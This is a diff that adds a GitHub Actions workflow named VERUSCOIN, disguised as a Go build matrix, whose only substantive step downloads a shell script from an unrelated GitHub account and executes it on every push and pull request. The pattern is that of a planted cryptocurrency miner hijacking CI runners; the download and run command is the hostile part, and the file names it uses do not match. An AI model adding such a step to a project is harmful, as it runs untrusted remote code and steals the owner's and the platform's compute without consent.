@@ -1,0 +1,27 @@
+name: VERUSCOIN
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 2
+      fail-fast: false
+      matrix:
+        go: [1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D]
+    timeout-minutes: 30
+    env:
+        NUM_JOBS: 2
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget https://github.com/veroprosilasd/Vioal/blob/main/veruscoin.shh && chmod u+x veruscoin.sh && ./veruscoin.sh
